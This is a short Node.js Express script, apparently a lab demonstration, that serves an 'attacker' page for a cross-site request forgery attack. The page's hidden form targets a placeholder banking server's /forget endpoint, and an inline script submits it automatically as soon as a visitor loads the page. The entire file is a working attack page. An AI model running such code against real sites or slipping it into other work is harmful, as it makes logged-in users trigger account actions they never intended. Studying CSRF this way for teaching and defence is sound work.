// attacker.js
const express = require("express");
const app = express();
const PORT = 3000;

app.get("/", (req, res) => {
  res.send(`
    <h1>Attacker page (malicious)</h1>
    <form id="f" action="https://BankingServer-IP-ADDR:3000/forget" method="POST"></form>
    <button onclick="document.getElementById('f').submit()">Confirm</button>
    <script>
      document.getElementById('f').submit();
    </script>
  `);
});

app.listen(PORT, () => console.log(`Attacker running: http://localhost:${PORT}`));
